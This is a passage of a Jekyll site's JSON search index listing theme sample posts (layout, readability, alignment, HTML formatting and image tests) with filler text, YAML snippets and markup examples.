        "excerpt":"This is a sample post with a large feature image1 up top and tons of text. Odio ad blue bottle vinyl, 90’s narwhal commodo bitters pour-over nostrud. Ugh est hashtag in, fingerstache adipisicing laboris esse Pinterest shabby chic Portland. Shoreditch bicycle rights anim, flexitarian laboris put a bird on it vinyl cupidatat narwhal. Hashtag artisan skateboard, flannel Bushwick nesciunt salvia aute fixie do plaid post-ironic dolor McSweeney’s. Cliche pour-over chambray nulla four loko skateboard sapiente hashtag.   Vero laborum commodo occupy. Semiotics voluptate mumblecore pug. Cosby sweater ullamco quinoa ennui assumenda, sapiente occupy delectus lo-fi. Ea fashion axe Marfa cillum aliquip. Retro Bushwick keytar cliche. Before they sold out sustainable gastropub Marfa readymade, ethical Williamsburg skateboard brunch qui consectetur gentrify semiotics. Mustache cillum irony, fingerstache magna pour-over keffiyeh tousled selfies.   Cupidatat 90’s lo-fi authentic try-hard   In pug Portland incididunt mlkshk put a bird on it vinyl quinoa. Terry Richardson shabby chic +1, scenester Tonx excepteur tempor fugiat voluptate fingerstache aliquip nisi next level. Farm-to-table hashtag Truffaut, Odd Future ex meggings gentrify single-origin coffee try-hard 90’s.      Sartorial hoodie   Labore viral forage   Tote bag selvage   DIY exercitation et id ugh tumblr church-key   Incididunt umami sriracha, ethical fugiat VHS ex assumenda yr irure direct trade. Marfa Truffaut bicycle rights, kitsch placeat Etsy kogi asymmetrical. Beard locavore flexitarian, kitsch photo booth hoodie plaid ethical readymade leggings yr.   Aesthetic odio dolore, meggings disrupt qui readymade stumptown brunch Terry Richardson pour-over gluten-free. Banksy american apparel in selfies, biodiesel flexitarian organic meh wolf quinoa gentrify banjo kogi. Readymade tofu ex, scenester dolor umami fingerstache occaecat fashion axe Carles jean shorts minim. Keffiyeh fashion axe nisi Godard mlkshk dolore. Lomo you probably haven’t heard of them eu non, Odd Future Truffaut pug keytar meggings McSweeney’s Pinterest cred. Etsy literally aute esse, eu bicycle rights qui meggings fanny pack. Gentrify leggings pug flannel duis.   Forage occaecat cardigan qui   Fashion axe hella gastropub lo-fi kogi 90’s aliquip +1 veniam delectus tousled. Cred sriracha locavore gastropub kale chips, iPhone mollit sartorial. Anim dolore 8-bit, pork belly dolor photo booth aute flannel small batch. Dolor disrupt ennui, tattooed whatever salvia Banksy sartorial roof party selfies raw denim sint meh pour-over. Ennui eu cardigan sint, gentrify iPhone cornhole.      Whatever velit occaecat quis deserunt gastropub, leggings elit tousled roof party 3 wolf moon kogi pug blue bottle ea. Fashion axe shabby chic Austin quinoa pickled laborum bitters next level, disrupt deep v accusamus non fingerstache.    Tote bag asymmetrical elit sunt. Occaecat authentic Marfa, hella McSweeney’s next level irure veniam master cleanse. Sed hoodie letterpress artisan wolf leggings, 3 wolf moon commodo ullamco. Anim occupy ea labore Terry Richardson. Tofu ex master cleanse in whatever pitchfork banh mi, occupy fugiat fanny pack Austin authentic. Magna fugiat 3 wolf moon, labore McSweeney’s sustainable vero consectetur. Gluten-free disrupt enim, aesthetic fugiat jean shorts trust fund keffiyeh magna try-hard.   Hoodie Duis   Actually salvia consectetur, hoodie duis lomo YOLO sunt sriracha. Aute pop-up brunch farm-to-table odio, salvia irure occaecat. Sriracha small batch literally skateboard. Echo Park nihil hoodie, aliquip forage artisan laboris. Trust fund reprehenderit nulla locavore. Stumptown raw denim kitsch, keffiyeh nulla twee dreamcatcher fanny pack ullamco 90’s pop-up est culpa farm-to-table. Selfies 8-bit do pug odio.   Thundercats Ho!   Fingerstache thundercats Williamsburg, deep v scenester Banksy ennui vinyl selfies mollit biodiesel duis odio pop-up. Banksy 3 wolf moon try-hard, sapiente enim stumptown deep v ad letterpress. Squid beard brunch, exercitation raw denim yr sint direct trade. Raw denim narwhal id, flannel DIY McSweeney’s seitan. Letterpress artisan bespoke accusamus, meggings laboris consequat Truffaut qui in seitan. Sustainable cornhole Schlitz, twee Cosby sweater banh mi deep v forage letterpress flannel whatever keffiyeh. Sartorial cred irure, semiotics ethical sed blue bottle nihil letterpress.   Occupy et selvage squid, pug brunch blog nesciunt hashtag mumblecore skateboard yr kogi. Ugh small batch swag four loko. Fap post-ironic qui tote bag farm-to-table american apparel scenester keffiyeh vero, swag non pour-over gentrify authentic pitchfork. Schlitz scenester lo-fi voluptate, tote bag irony bicycle rights pariatur vero Vice freegan wayfarers exercitation nisi shoreditch. Chambray tofu vero sed. Street art swag literally leggings, Cosby sweater mixtape PBR lomo Banksy non in pitchfork ennui McSweeney’s selfies. Odd Future Banksy non authentic.   Aliquip enim artisan dolor post-ironic. Pug tote bag Marfa, deserunt pour-over Portland wolf eu odio intelligentsia american apparel ugh ea. Sunt viral et, 3 wolf moon gastropub pug id. Id fashion axe est typewriter, mlkshk Portland art party aute brunch. Sint pork belly Cosby sweater, deep v mumblecore kitsch american apparel. Try-hard direct trade tumblr sint skateboard. Adipisicing bitters excepteur biodiesel, pickled gastropub aute veniam.                  Texture image courtesty of Lovetextures &#8617;           ","categories": [],
        "tags": ["sample post","readability","test"],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-header-image-text-readability/",
        "teaser":null},{
        "title": "Layout: Header Image (Vertical)",
        "excerpt":"This post should display a header image, if the theme supports it.   Non-square images can provide some unique styling issues.   This post tests a vertical header image.  ","categories": ["Layout","Uncategorized"],
        "tags": ["edge case","featured image","image","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-header-image-vertical/",
        "teaser":null},{
        "title": "Layout: Header Overlay with Background Fill",
        "excerpt":"This post should display a header with a solid background color, if the theme supports it.   Non-square images can provide some unique styling issues.   This post tests overlay headers.  ","categories": ["Layout","Uncategorized"],
        "tags": ["edge case","image","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-header-overlay-color/",
        "teaser":null},{
        "title": "Layout: Header Image Overlay",
        "excerpt":"This post should display a header with an overlay image, if the theme supports it.   Non-square images can provide some unique styling issues.   This post tests overlay header images.   Overlay filter   You can use it by specifying the opacity (between 0 and 1) of a black overlay like so:      excerpt: \"This post should [...]\" header:   overlay_image: /assets/images/unsplash-image-1.jpg   overlay_filter: 0.5 # same as adding an opacity of 0.5 to a black background   caption: \"Photo credit: [**Unsplash**](https://unsplash.com)\"   actions:     - label: \"More Info\"       url: \"https://unsplash.com\"   Or if you want to do more fancy things, go full rgba:      excerpt: \"This post should [...]\" header:   overlay_image: /assets/images/unsplash-image-1.jpg   overlay_filter: rgba(255, 0, 0, 0.5)   caption: \"Photo credit: [**Unsplash**](https://unsplash.com)\"   actions:     - label: \"More Info\"       url: \"https://unsplash.com\"  ","categories": ["Layout","Uncategorized"],
        "tags": ["edge case","image","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-header-overlay-image/",
        "teaser":null},{
        "title": "Layout: More Tag",
        "excerpt":"This content is before the excerpt separator tag.   Additional content before the more tag.     And this content is after the more tag.  ","categories": ["Layout","Uncategorized"],
        "tags": ["content","read more","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-more-tag/",
        "teaser":null},{
        "title": "Layout: Sidebar Custom",
        "excerpt":"This post has a custom sidebar set in the post’s YAML Front Matter.   An example of how that YAML could look is:   sidebar:   - title: \"Title\"     image: http://placehold.it/350x250     image_alt: \"image\"     text: \"Some text here.\"   - title: \"Another Title\"     text: \"More text here.\"  ","categories": [],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-sidebar-custom/",
        "teaser":null},{
        "title": "Layout: Sidebar with Navigation List",
        "excerpt":"This post has a custom navigation list set in the post’s YAML Front Matter.   sidebar:   title: \"Sample Title\"   nav: sidebar-sample   Along with navigation elements set in _data/navigation.yml.   sidebar-sample:   - title: \"Parent Page A\"     children:       - title: \"Child Page A1\"         url: /       - title: \"Child Page A2\"         url: /       - title: \"Child Page A3\"         url: /       - title: \"Child Page A4\"         url: /   - title: \"Parent Page B\"     children:       - title: \"Child Page B1\"         url: /       - title: \"Child Page B2\"         url: /       - title: \"Child Page B3\"         url: /       - title: \"Child Page B4\"         url: /       - title: \"Child Page B5\"         url: /   - title: \"Parent Page C\"     children:       - title: \"Child Page C1\"         url: /       - title: \"Child Page C2\"         url: /       - title: \"Child Page C3\"         url: /       - title: \"Child Page C4\"         url: /       - title: \"Child Page C5\"         url: /   - title: \"Parent Page D\"     children:       - title: \"Child Page D1\"         url: /       - title: \"Child Page D2\"         url: /  ","categories": [],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-sidebar-nav-list/",
        "teaser":null},{
        "title": "Wide Single Layout Page",
        "excerpt":"When using layout: single add the following front matter to a page or post to widen the main content:   classes: wide   Portland in shoreditch Vice, labore typewriter pariatur hoodie fap sartorial Austin. Pinterest literally occupy Schlitz forage. Odio ad blue bottle vinyl, 90’s narwhal commodo bitters pour-over nostrud. Ugh est hashtag in, fingerstache adipisicing laboris esse Pinterest shabby chic Portland. Shoreditch bicycle rights anim, flexitarian laboris put a bird on it vinyl cupidatat narwhal. Hashtag artisan skateboard, flannel Bushwick nesciunt salvia aute fixie do plaid post-ironic dolor McSweeney’s. Cliche pour-over chambray nulla four loko skateboard sapiente hashtag.   Vero laborum commodo occupy. Semiotics voluptate mumblecore pug. Cosby sweater ullamco quinoa ennui assumenda, sapiente occupy delectus lo-fi. Ea fashion axe Marfa cillum aliquip. Retro Bushwick keytar cliche. Before they sold out sustainable gastropub Marfa readymade, ethical Williamsburg skateboard brunch qui consectetur gentrify semiotics. Mustache cillum irony, fingerstache magna pour-over keffiyeh tousled selfies.   Cupidatat 90’s lo-fi authentic try-hard   In pug Portland incididunt mlkshk put a bird on it vinyl quinoa. Terry Richardson shabby chic +1, scenester Tonx excepteur tempor fugiat voluptate fingerstache aliquip nisi next level. Farm-to-table hashtag Truffaut, Odd Future ex meggings gentrify single-origin coffee try-hard 90’s.      Sartorial hoodie   Labore viral forage   Tote bag selvage   DIY exercitation et id ugh tumblr church-key   Incididunt umami sriracha, ethical fugiat VHS ex assumenda yr irure direct trade. Marfa Truffaut bicycle rights, kitsch placeat Etsy kogi asymmetrical. Beard locavore flexitarian, kitsch photo booth hoodie plaid ethical readymade leggings yr.   Aesthetic odio dolore, meggings disrupt qui readymade stumptown brunch Terry Richardson pour-over gluten-free. Banksy american apparel in selfies, biodiesel flexitarian organic meh wolf quinoa gentrify banjo kogi. Readymade tofu ex, scenester dolor umami fingerstache occaecat fashion axe Carles jean shorts minim. Keffiyeh fashion axe nisi Godard mlkshk dolore. Lomo you probably haven’t heard of them eu non, Odd Future Truffaut pug keytar meggings McSweeney’s Pinterest cred. Etsy literally aute esse, eu bicycle rights qui meggings fanny pack. Gentrify leggings pug flannel duis.   Forage occaecat cardigan qui   Fashion axe hella gastropub lo-fi kogi 90’s aliquip +1 veniam delectus tousled. Cred sriracha locavore gastropub kale chips, iPhone mollit sartorial. Anim dolore 8-bit, pork belly dolor photo booth aute flannel small batch. Dolor disrupt ennui, tattooed whatever salvia Banksy sartorial roof party selfies raw denim sint meh pour-over. Ennui eu cardigan sint, gentrify iPhone cornhole.      Whatever velit occaecat quis deserunt gastropub, leggings elit tousled roof party 3 wolf moon kogi pug blue bottle ea. Fashion axe shabby chic Austin quinoa pickled laborum bitters next level, disrupt deep v accusamus non fingerstache.    Tote bag asymmetrical elit sunt. Occaecat authentic Marfa, hella McSweeney’s next level irure veniam master cleanse. Sed hoodie letterpress artisan wolf leggings, 3 wolf moon commodo ullamco. Anim occupy ea labore Terry Richardson. Tofu ex master cleanse in whatever pitchfork banh mi, occupy fugiat fanny pack Austin authentic. Magna fugiat 3 wolf moon, labore McSweeney’s sustainable vero consectetur. Gluten-free disrupt enim, aesthetic fugiat jean shorts trust fund keffiyeh magna try-hard.   Hoodie Duis   Actually salvia consectetur, hoodie duis lomo YOLO sunt sriracha. Aute pop-up brunch farm-to-table odio, salvia irure occaecat. Sriracha small batch literally skateboard. Echo Park nihil hoodie, aliquip forage artisan laboris. Trust fund reprehenderit nulla locavore. Stumptown raw denim kitsch, keffiyeh nulla twee dreamcatcher fanny pack ullamco 90’s pop-up est culpa farm-to-table. Selfies 8-bit do pug odio.   Thundercats Ho!   Fingerstache thundercats Williamsburg, deep v scenester Banksy ennui vinyl selfies mollit biodiesel duis odio pop-up. Banksy 3 wolf moon try-hard, sapiente enim stumptown deep v ad letterpress. Squid beard brunch, exercitation raw denim yr sint direct trade. Raw denim narwhal id, flannel DIY McSweeney’s seitan. Letterpress artisan bespoke accusamus, meggings laboris consequat Truffaut qui in seitan. Sustainable cornhole Schlitz, twee Cosby sweater banh mi deep v forage letterpress flannel whatever keffiyeh. Sartorial cred irure, semiotics ethical sed blue bottle nihil letterpress.   Occupy et selvage squid, pug brunch blog nesciunt hashtag mumblecore skateboard yr kogi. Ugh small batch swag four loko. Fap post-ironic qui tote bag farm-to-table american apparel scenester keffiyeh vero, swag non pour-over gentrify authentic pitchfork. Schlitz scenester lo-fi voluptate, tote bag irony bicycle rights pariatur vero Vice freegan wayfarers exercitation nisi shoreditch. Chambray tofu vero sed. Street art swag literally leggings, Cosby sweater mixtape PBR lomo Banksy non in pitchfork ennui McSweeney’s selfies. Odd Future Banksy non authentic.   Aliquip enim artisan dolor post-ironic. Pug tote bag Marfa, deserunt pour-over Portland wolf eu odio intelligentsia american apparel ugh ea. Sunt viral et, 3 wolf moon gastropub pug id. Id fashion axe est typewriter, mlkshk Portland art party aute brunch. Sint pork belly Cosby sweater, deep v mumblecore kitsch american apparel. Try-hard direct trade tumblr sint skateboard. Adipisicing bitters excepteur biodiesel, pickled gastropub aute veniam.  ","categories": [],
        "tags": ["sample post","readability","test"],
        "url": "https://zjgcjy.github.io/origin/2012-05-22-markup-text-readability-wide-page/",
        "teaser":null},{
        "title": "Markup: Text Readability Test",
        "excerpt":"Portland in shoreditch Vice, labore typewriter pariatur hoodie fap sartorial Austin. Pinterest literally occupy Schlitz forage. Odio ad blue bottle vinyl, 90’s narwhal commodo bitters pour-over nostrud. Ugh est hashtag in, fingerstache adipisicing laboris esse Pinterest shabby chic Portland. Shoreditch bicycle rights anim, flexitarian laboris put a bird on it vinyl cupidatat narwhal. Hashtag artisan skateboard, flannel Bushwick nesciunt salvia aute fixie do plaid post-ironic dolor McSweeney’s. Cliche pour-over chambray nulla four loko skateboard sapiente hashtag.   Vero laborum commodo occupy. Semiotics voluptate mumblecore pug. Cosby sweater ullamco quinoa ennui assumenda, sapiente occupy delectus lo-fi. Ea fashion axe Marfa cillum aliquip. Retro Bushwick keytar cliche. Before they sold out sustainable gastropub Marfa readymade, ethical Williamsburg skateboard brunch qui consectetur gentrify semiotics. Mustache cillum irony, fingerstache magna pour-over keffiyeh tousled selfies.   Cupidatat 90’s lo-fi authentic try-hard   In pug Portland incididunt mlkshk put a bird on it vinyl quinoa. Terry Richardson shabby chic +1, scenester Tonx excepteur tempor fugiat voluptate fingerstache aliquip nisi next level. Farm-to-table hashtag Truffaut, Odd Future ex meggings gentrify single-origin coffee try-hard 90’s.      Sartorial hoodie   Labore viral forage   Tote bag selvage   DIY exercitation et id ugh tumblr church-key   Incididunt umami sriracha, ethical fugiat VHS ex assumenda yr irure direct trade. Marfa Truffaut bicycle rights, kitsch placeat Etsy kogi asymmetrical. Beard locavore flexitarian, kitsch photo booth hoodie plaid ethical readymade leggings yr.   Aesthetic odio dolore, meggings disrupt qui readymade stumptown brunch Terry Richardson pour-over gluten-free. Banksy american apparel in selfies, biodiesel flexitarian organic meh wolf quinoa gentrify banjo kogi. Readymade tofu ex, scenester dolor umami fingerstache occaecat fashion axe Carles jean shorts minim. Keffiyeh fashion axe nisi Godard mlkshk dolore. Lomo you probably haven’t heard of them eu non, Odd Future Truffaut pug keytar meggings McSweeney’s Pinterest cred. Etsy literally aute esse, eu bicycle rights qui meggings fanny pack. Gentrify leggings pug flannel duis.   Forage occaecat cardigan qui   Fashion axe hella gastropub lo-fi kogi 90’s aliquip +1 veniam delectus tousled. Cred sriracha locavore gastropub kale chips, iPhone mollit sartorial. Anim dolore 8-bit, pork belly dolor photo booth aute flannel small batch. Dolor disrupt ennui, tattooed whatever salvia Banksy sartorial roof party selfies raw denim sint meh pour-over. Ennui eu cardigan sint, gentrify iPhone cornhole.      Whatever velit occaecat quis deserunt gastropub, leggings elit tousled roof party 3 wolf moon kogi pug blue bottle ea. Fashion axe shabby chic Austin quinoa pickled laborum bitters next level, disrupt deep v accusamus non fingerstache.    Tote bag asymmetrical elit sunt. Occaecat authentic Marfa, hella McSweeney’s next level irure veniam master cleanse. Sed hoodie letterpress artisan wolf leggings, 3 wolf moon commodo ullamco. Anim occupy ea labore Terry Richardson. Tofu ex master cleanse in whatever pitchfork banh mi, occupy fugiat fanny pack Austin authentic. Magna fugiat 3 wolf moon, labore McSweeney’s sustainable vero consectetur. Gluten-free disrupt enim, aesthetic fugiat jean shorts trust fund keffiyeh magna try-hard.   Hoodie Duis   Actually salvia consectetur, hoodie duis lomo YOLO sunt sriracha. Aute pop-up brunch farm-to-table odio, salvia irure occaecat. Sriracha small batch literally skateboard. Echo Park nihil hoodie, aliquip forage artisan laboris. Trust fund reprehenderit nulla locavore. Stumptown raw denim kitsch, keffiyeh nulla twee dreamcatcher fanny pack ullamco 90’s pop-up est culpa farm-to-table. Selfies 8-bit do pug odio.   Thundercats Ho!   Fingerstache thundercats Williamsburg, deep v scenester Banksy ennui vinyl selfies mollit biodiesel duis odio pop-up. Banksy 3 wolf moon try-hard, sapiente enim stumptown deep v ad letterpress. Squid beard brunch, exercitation raw denim yr sint direct trade. Raw denim narwhal id, flannel DIY McSweeney’s seitan. Letterpress artisan bespoke accusamus, meggings laboris consequat Truffaut qui in seitan. Sustainable cornhole Schlitz, twee Cosby sweater banh mi deep v forage letterpress flannel whatever keffiyeh. Sartorial cred irure, semiotics ethical sed blue bottle nihil letterpress.   Occupy et selvage squid, pug brunch blog nesciunt hashtag mumblecore skateboard yr kogi. Ugh small batch swag four loko. Fap post-ironic qui tote bag farm-to-table american apparel scenester keffiyeh vero, swag non pour-over gentrify authentic pitchfork. Schlitz scenester lo-fi voluptate, tote bag irony bicycle rights pariatur vero Vice freegan wayfarers exercitation nisi shoreditch. Chambray tofu vero sed. Street art swag literally leggings, Cosby sweater mixtape PBR lomo Banksy non in pitchfork ennui McSweeney’s selfies. Odd Future Banksy non authentic.   Aliquip enim artisan dolor post-ironic. Pug tote bag Marfa, deserunt pour-over Portland wolf eu odio intelligentsia american apparel ugh ea. Sunt viral et, 3 wolf moon gastropub pug id. Id fashion axe est typewriter, mlkshk Portland art party aute brunch. Sint pork belly Cosby sweater, deep v mumblecore kitsch american apparel. Try-hard direct trade tumblr sint skateboard. Adipisicing bitters excepteur biodiesel, pickled gastropub aute veniam.  ","categories": [],
        "tags": ["sample post","readability","test"],
        "url": "https://zjgcjy.github.io/origin/2012-05-22-markup-text-readability/",
        "teaser":null},{
        "title": "Markup: Title *with* **Markdown**",
        "excerpt":"Verify that:      The post title renders the word “with” in italics and the word “Markdown” in bold.   The post title markup should be removed from the browser window / tab.  ","categories": ["Markdown"],
        "tags": ["css","html","title"],
        "url": "https://zjgcjy.github.io/origin/2013-01-05-markup-title-with-markup/",
        "teaser":null},{
        "title": "Markup: Title with Special&nbsp;---&nbsp;Characters",
        "excerpt":"Putting special characters in the title should have no adverse effect on the layout or functionality.   Special characters in the post title have been known to cause issues with JavaScript and XML when not properly encoded and escaped.   Latin Character Tests   This is a test to see if the fonts used in this theme support basic Latin characters.                  !                      &#8220;                      #                      $                      %                      &amp;                      &#8216;                      (                      )                      *                          +                      ,                      &#8211;                      .                      /                                     1                      2                      3                      4                          5                      6                      7                      8                      9                      :                      ;                      &gt;                      =                      &lt;                          ?                      @                      A                      B                      C                      D                      E                      F                      G                      H                          I                      J                      K                      L                      M                      N                      O                      P                      Q                      R                          S                      T                      U                      V                      W                      X                      Y                      Z                      [                                         ]                      ^                      _                      `                      a                      b                      c                      d                      e                      f                          g                      h                      i                      j                      k                      l                      m                      n                      o                      p                          q                      r                      s                      t                      u                      v                      w                      x                      y                      z                          {                      |                      }                      ~                                                                                                    ","categories": ["Markup"],
        "tags": ["html","markup","post","title"],
        "url": "https://zjgcjy.github.io/origin/2013-01-05-markup-title-with-special-characters/",
        "teaser":null},{
        "title": "Markup: Text Alignment",
        "excerpt":"Default   This is a paragraph. It should not have any alignment of any kind. It should just flow like you would normally expect. Nothing fancy. Just straight up text, free flowing, with love. Completely neutral and not picking a side or sitting on the fence. It just is. It just freaking is. It likes where it is. It does not feel compelled to pick a side. Leave him be. It will just be better that way. Trust me.   Left Align   This is a paragraph. It is left aligned. Because of this, it is a bit more liberal in it’s views. It’s favorite color is green. Left align tends to be more eco-friendly, but it provides no concrete evidence that it really is. Even though it likes share the wealth evenly, it leaves the equal distribution up to justified alignment.   Center Align   This is a paragraph. It is center aligned. Center is, but nature, a fence sitter. A flip flopper. It has a difficult time making up its mind. It wants to pick a side. Really, it does. It has the best intentions, but it tends to complicate matters more than help. The best you can do is try to win it over and hope for the best. I hear center align does take bribes.   Right Align   This is a paragraph. It is right aligned. It is a bit more conservative in it’s views. It’s prefers to not be told what to do or how to do it. Right align totally owns a slew of guns and loves to head to the range for some practice. Which is cool and all. I mean, it’s a pretty good shot from at least four or five football fields away. Dead on. So boss.   Justify Align   This is a paragraph. It is justify aligned. It gets really mad when people associate it with Justin Timberlake. Typically, justified is pretty straight laced. It likes everything to be in it’s place and not all cattywampus like the rest of the aligns. I am not saying that makes it better than the rest of the aligns, but it does tend to put off more of an elitist attitude.  ","categories": ["Markup"],
        "tags": ["alignment","content","css","markup"],
        "url": "https://zjgcjy.github.io/origin/2013-01-09-markup-text-alignment/",
        "teaser":null},{
        "title": "Markup: Image Alignment",
        "excerpt":"Welcome to image alignment! The best way to demonstrate the ebb and flow of the various image positioning options is to nestle them snuggly among an ocean of words. Grab a paddle and let’s get started.      The image above happens to be centered.    The rest of this paragraph is filler for the sake of seeing the text wrap around the 150×150 image, which is left aligned.   As you can see the should be some space above, below, and to the right of the image. The text should not be creeping on the image. Creeping is just not right. Images need breathing room too. Let them speak like you words. Let them do their jobs without any hassle from the text. In about one more sentence here, we’ll see that the text moves from the right of the image down below the image in seamless transition. Again, letting the do it’s thing. Mission accomplished!   And now for a massively large image. It also has no alignment.      The image above, though 1200px wide, should not overflow the content area. It should remain contained with no visible disruption to the flow of content.      And now we’re going to shift things to the right align. Again, there should be plenty of room above, below, and to the left of the image. Just look at him there — Hey guy! Way to rock that right side. I don’t care what the left aligned image says, you look great. Don’t let anyone else tell you differently.   In just a bit here, you should see the text start to wrap below the right aligned image and settle in nicely. There should still be plenty of room and everything should be sitting pretty. Yeah — Just like that. It never felt so good to be right.   And just when you thought we were done, we’re going to do them all over again with captions!         Look at 580 x 300 getting some love.   The figure above happens to be centered. The caption also has a link in it, just to see if it does anything funky.         Itty-bitty caption.   The rest of this paragraph is filler for the sake of seeing the text wrap around the 150×150 image, which is left aligned.   As you can see the should be some space above, below, and to the right of the image. The text should not be creeping on the image. Creeping is just not right. Images need breathing room too. Let them speak like you words. Let them do their jobs without any hassle from the text. In about one more sentence here, we’ll see that the text moves from the right of the image down below the image in seamless transition. Again, letting the do it’s thing. Mission accomplished!   And now for a massively large image. It also has no alignment.         Massive image comment for your eyeballs.   The figure element above has an inline style of width: 1200px set which should break it outside of the normal content flow.         Feels good to be right all the time.   And now we’re going to shift things to the right align. Again, there should be plenty of room above, below, and to the left of the image. Just look at him there — Hey guy! Way to rock that right side. I don’t care what the left aligned image says, you look great. Don’t let anyone else tell you differently.   In just a bit here, you should see the text start to wrap below the right aligned image and settle in nicely. There should still be plenty of room and everything should be sitting pretty. Yeah — Just like that. It never felt so good to be right.   And that’s a wrap, yo! You survived the tumultuous waters of alignment. Image alignment achievement unlocked!  ","categories": ["Markup"],
        "tags": ["alignment","captions","content","css","image","markup"],
        "url": "https://zjgcjy.github.io/origin/2013-01-10-markup-image-alignment/",
        "teaser":null},{
        "title": "Markup: HTML Tags and Formatting",
        "excerpt":"A variety of common markup showing how the theme styles them.   Header two   Header three   Header four   Header five   Header six   Blockquotes   Single line blockquote:      Stay hungry. Stay foolish.    Multi line blockquote with a cite reference:      People think focus means saying yes to the thing you’ve got to focus on. But that’s not what it means at all. It means saying no to the hundred other good ideas that there are. You have to pick carefully. I’m actually as proud of the things we haven’t done as the things I have done. Innovation is saying no to 1,000 things.    Steve Jobs — Apple Worldwide Developers’ Conference, 1997   Tables                  Employee       Salary                               John Doe       $1       Because that’s all Steve Jobs needed for a salary.                 Jane Doe       $100K       For all the blogging she does.                 Fred Bloggs       $100M       Pictures are worth a thousand words, right? So Jane × 1,000.                 Jane Bloggs       $100B       With hair like that?! Enough said.                          Header1       Header2       Header3                       cell1       cell2       cell3                 cell4       cell5       cell6                       cell1       cell2       cell3                 cell4       cell5       cell6                       Foot1       Foot2       Foot3           Definition Lists      Definition List Title   Definition list division.   Startup   A startup company or startup is a company or temporary organization designed to search for a repeatable and scalable business model.   #dowork   Coined by Rob Dyrdek and his personal body guard Christopher “Big Black” Boykins, “Do Work” works as a self motivator, to motivating your friends.   Do It Live   I’ll let Bill O’Reilly explain this one.   Unordered Lists (Nested)      List item one            List item one                    List item one           List item two           List item three           List item four                       List item two       List item three       List item four           List item two   List item three   List item four   Ordered List (Nested)      List item one            List item one                    List item one           List item two           List item three           List item four                       List item two       List item three       List item four           List item two   List item three   List item four   Forms           Personalia:     Name:       Email:       Date of birth:       Buttons   Make any link standout more when applying the .btn class.   &lt;a href=\"#\" class=\"btn--success\"&gt;Success Button&lt;/a&gt;   Default Button Primary Button Success Button Warning Button Danger Button Info Button Inverse Button Light Outline Button   [Default Button Text](#link){: .btn} [Primary Button Text](#link){: .btn .btn--primary} [Success Button Text](#link){: .btn .btn--success} [Warning Button Text](#link){: .btn .btn--warning} [Danger Button Text](#link){: .btn .btn--danger} [Info Button Text](#link){: .btn .btn--info} [Inverse Button](#link){: .btn .btn--inverse} [Light Outline Button](#link){: .btn .btn--light-outline}   X-Large Button Large Button Default Button Small Button   [X-Large Button](#link){: .btn .btn--primary .btn--x-large} [Large Button](#link){: .btn .btn--primary .btn--large} [Default Button](#link){: .btn .btn--primary } [Small Button](#link){: .btn .btn--primary .btn--small}   Notices   Watch out! This paragraph of text has been emphasized with the {: .notice} class.   Watch out! This paragraph of text has been emphasized with the {: .notice--primary} class.   Watch out! This paragraph of text has been emphasized with the {: .notice--info} class.   Watch out! This paragraph of text has been emphasized with the {: .notice--warning} class.   Watch out! This paragraph of text has been emphasized with the {: .notice--success} class.   Watch out! This paragraph of text has been emphasized with the {: .notice--danger} class.   HTML Tags   Address Tag      1 Infinite Loop  Cupertino, CA 95014  United States   Anchor Tag (aka. Link)   This is an example of a link.   Abbreviation Tag   The abbreviation CSS stands for “Cascading Style Sheets”.   Cite Tag   “Code is poetry.” —Automattic   Code Tag   You will learn later on in these tests that word-wrap: break-word; will be your best friend.   Strike Tag   This tag will let you strikeout text.   Emphasize Tag   The emphasize tag should italicize text.   Insert Tag   This tag should denote inserted text.   Keyboard Tag   This scarcely known tag emulates keyboard text, which is usually styled like the &lt;code&gt; tag.   Preformatted Tag   This tag styles large blocks of code.    .post-title { \tmargin: 0 0 5px; \tfont-weight: bold; \tfont-size: 38px; \tline-height: 1.2; \tand here's a line of some really, really, really, really long text, just to see how the PRE tag handles it and to find out how it overflows; }   Quote Tag   Developers, developers, developers… –Steve Ballmer   Strong Tag   This tag shows bold text.   Subscript Tag   Getting our science styling on with H2O, which should push the “2” down.   Superscript Tag   Still sticking with science and Albert Einstein’s E = MC2, which should lift the 2 up.   Variable Tag   This allows you to denote variables.  ","categories": ["Markup"],
        "tags": ["content","css","formatting","html","markup"],
        "url": "https://zjgcjy.github.io/origin/2013-01-11-markup-html-tags-and-formatting/",
        "teaser":"https://zjgcjy.github.io/assets/images/markup-syntax-highlighting-teaser.jpg"},{
        "title": "Markup: Another Post with Images",
        "excerpt":"Here are some examples of what a post with images might look like. If you want to display two or three images next to each other responsively use figure with the appropriate class. Each instance of figure is auto-numbered and displayed in the caption.   Figures (for images or video)   One Up    \t \tMorning Fog Emerging From Trees by A Guy Taking Pictures, on Flickr.   Vero laborum commodo occupy. Semiotics voluptate mumblecore pug. Cosby sweater ullamco quinoa ennui assumenda, sapiente occupy delectus lo-fi. Ea fashion axe Marfa cillum aliquip. Retro Bushwick keytar cliche. Before they sold out sustainable gastropub Marfa readymade, ethical Williamsburg skateboard brunch qui consectetur gentrify semiotics. Mustache cillum irony, fingerstache magna pour-over keffiyeh tousled selfies.   Two Up   Apply the half class like so to display two images side by side that share the same caption.   &lt;figure class=\"half\"&gt;     &lt;a href=\"/assets/images/image-filename-1-large.jpg\"&gt;&lt;img src=\"/assets/images/image-filename-1.jpg\"&gt;&lt;/a&gt;     &lt;a href=\"/assets/images/image-filename-2-large.jpg\"&gt;&lt;img src=\"/assets/images/image-filename-2.jpg\"&gt;&lt;/a&gt;     &lt;figcaption&gt;Caption describing these two images.&lt;/figcaption&gt; &lt;/figure&gt;   And you’ll get something that looks like this:    \t \t \tTwo images.   Three Up   Apply the third class like so to display three images side by side that share the same caption.   &lt;figure class=\"third\"&gt; \t&lt;img src=\"/images/image-filename-1.jpg\"&gt; \t&lt;img src=\"/images/image-filename-2.jpg\"&gt; \t&lt;img src=\"/images/image-filename-3.jpg\"&gt; \t&lt;figcaption&gt;Caption describing these three images.&lt;/figcaption&gt; &lt;/figure&gt;   And you’ll get something that looks like this:    \t \t \t \tThree images.  ","categories": [],
        "tags": ["sample post","images","test"],
        "url": "https://zjgcjy.github.io/origin/2013-05-22-markup-more-images/",
        "teaser":"http://farm9.staticflickr.com/8426/7758832526_cc8f681e48_c.jpg"},{
